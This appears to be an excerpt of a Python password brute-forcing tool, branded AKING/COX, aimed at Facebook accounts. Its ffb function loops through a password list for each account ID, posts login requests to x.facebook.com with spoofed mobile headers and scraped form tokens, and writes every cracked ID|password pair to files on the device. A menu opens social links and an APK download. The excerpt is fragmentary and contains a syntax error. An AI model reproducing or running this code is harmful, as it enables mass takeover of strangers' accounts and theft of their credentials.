...
os.system('xdg-open https://www.facebook.com/profile.php?id=100072445717802')
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://call.whatsapp.com/video/z1sy7GrmS7OnX2nVwkGNkS');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/AKING_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100072445717802');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [COX] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        head = {'Host':'x.facebook.com','content-length': '1433','sec-fetch-dest':'empty','x_fb_background_state':'1',
'user-agent':'Mozilla/5.0 (Linux; Android 10; TECNO KE5j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36',
'accept': */*,'origin':'https://x.facebook.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','referer':'https://x.facebook.com/login/identify/?ctx=recover','accept-encoding':'gzip, deflate, br','accept-language':'en-US,en;q=0.9'}
                        getlog = session.get(f'https://x.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://web.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [COX-OK] %s | %s'%(ids,pas))
                                open('/sdcard/AKING-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [COX-CP] '+ids+' | '+pas+'\033[1;97m')
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/COX-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [COX-OK] '+uid+' | '+pas+'\033[1;97m')
